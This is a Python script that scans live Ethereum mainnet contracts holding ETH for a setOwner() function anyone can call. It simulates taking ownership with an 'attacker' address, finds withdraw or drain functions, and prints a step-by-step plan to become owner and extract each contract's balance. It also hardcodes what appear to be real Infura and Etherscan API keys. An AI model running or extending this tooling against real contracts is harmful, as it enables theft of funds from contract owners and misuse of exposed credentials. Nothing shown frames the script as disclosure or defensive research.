#!/usr/bin/env python3
"""
Analyze contracts where setOwner(address) is callable
"""
import json
import subprocess
import re

RPC = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c"
ETHERSCAN_API = "5UWN6DNT7UZCEJYNE3J6FCVAWH4QJW255K"

def rpc_call(method, params):
    payload = {"jsonrpc": "2.0", "method": method, "params": params, "id": 1}
    cmd = ["curl", "-s", "-X", "POST", "-H", "Content-Type: application/json",
           "-d", json.dumps(payload), RPC]
    result = subprocess.run(cmd, capture_output=True, text=True)
    try:
        return json.loads(result.stdout)
    except:
        return None

def eth_call(to, data, from_addr="0x0000000000000000000000000000000000000001"):
    result = rpc_call("eth_call", [{"to": to, "data": data, "from": from_addr}, "latest"])
    return result

def estimate_gas(to, data, from_addr="0x0000000000000000000000000000000000000001", value="0x0"):
    result = rpc_call("eth_estimateGas", [{"to": to, "data": data, "from": from_addr, "value": value}])
    return result

def get_balance(addr):
    result = rpc_call("eth_getBalance", [addr, "latest"])
    if result and 'result' in result:
        return int(result['result'], 16) / 1e18
    return 0

def get_code(addr):
    result = rpc_call("eth_getCode", [addr, "latest"])
    if result and 'result' in result:
        return result['result']
    return "0x"

def get_source(addr):
    url = f"https://api.etherscan.io/v2/api?chainid=1&module=contract&action=getsourcecode&address={addr}&apikey={ETHERSCAN_API}"
    result = subprocess.run(["curl", "-s", url], capture_output=True, text=True)
    try:
        data = json.loads(result.stdout)
        if data.get("status") == "1" and data.get("result"):
            return data["result"][0]
    except:
        pass
    return None

print("=" * 80)
print("SETOWNER CALLABLE - EXPLOITATION ANALYSIS")
print("=" * 80)

# Load findings
with open("comprehensive_findings.json", "r") as f:
    findings = json.load(f)

targets = findings["access_control_issues"]

for target in targets:
    addr = target["address"]
    balance = target["balance"]
    func = target["function"]
    gas = target["gas"]

    print(f"\n{'='*70}")
    print(f"[CONTRACT] {addr}")
    print(f"[BALANCE] {balance:.4f} ETH")
    print(f"[CALLABLE] {func} with gas {gas}")
    print("=" * 70)

    # Quick Parity check
    test_result = estimate_gas(addr, "0x12345678")
    if test_result and 'result' in test_result:
        random_gas = int(test_result['result'], 16)
        if abs(random_gas - gas) < 500:
            print("[!] PARITY PATTERN - Echo behavior, not exploitable")
            continue

    # Get source
    source_data = get_source(addr)
    if source_data:
        contract_name = source_data.get("ContractName", "Unknown")
        print(f"[CONTRACT NAME] {contract_name}")

        src = source_data.get("SourceCode", "")
        if src.startswith("{{"):
            try:
                src_json = json.loads(src[1:-1])
                sources = src_json.get("sources", {})
                src = "\n".join([v.get("content", "") for v in sources.values()])
            except:
                pass

        lines = src.split('\n')

        # Find setOwner function
        print("\n[SETOWNER FUNCTION SOURCE]")
        for i, line in enumerate(lines):
            if re.search(r"function\s+setOwner\s*\(", line, re.IGNORECASE):
                print(f"\n  Found at line {i+1}:")
                for j in range(i, min(i+20, len(lines))):
                    print(f"    {j+1}: {lines[j][:70]}")
                    if lines[j].strip() == "}" and j > i + 2:
                        break

        # Find withdraw functions
        print("\n[WITHDRAW FUNCTIONS]")
        for i, line in enumerate(lines):
            if re.search(r"function\s+(withdraw|claim|drain)\s*\(", line, re.IGNORECASE):
                print(f"  Line {i+1}: {line.strip()[:70]}")

    # Check current owner
    print("\n[CURRENT STATE]")
    owner_result = eth_call(addr, "0x8da5cb5b")  # owner()
    if owner_result and owner_result.get('result') and owner_result['result'] != "0x":
        owner = "0x" + owner_result['result'][26:]
        print(f"  Current owner: {owner}")

    # Try actually calling setOwner
    print("\n[EXPLOIT TEST]")
    # Try setOwner with our address (use a test address)
    attacker = "0x1234567890123456789012345678901234567890"
    set_owner_data = "0x13af4035" + attacker[2:].zfill(64)

    result = estimate_gas(addr, set_owner_data)
    if result:
        if 'result' in result:
            gas = int(result['result'], 16)
            print(f"  [+] setOwner() CALLABLE! Gas: {gas}")

            # This is callable! Check what we can do as owner
            print("\n  [POTENTIAL EXPLOIT]")
            print(f"    1. Call setOwner({attacker}) to become owner")
            print(f"    2. Call withdraw/drain functions as new owner")
            print(f"    3. Extract {balance:.2f} ETH")

            # Check withdraw
            withdraw_result = estimate_gas(addr, "0x3ccfd60b")  # withdraw()
            if withdraw_result and 'result' in withdraw_result:
                print(f"    withdraw() gas: {int(withdraw_result['result'], 16)}")

        elif 'error' in result:
            err = result['error'].get('message', '')
            print(f"  [-] setOwner(): {err}")
            if "only" in err.lower() or "owner" in err.lower() or "auth" in err.lower():
                print(f"      Protected - only current owner can call")

print("\n" + "=" * 80)
print("ANALYSIS COMPLETE")
print("=" * 80)
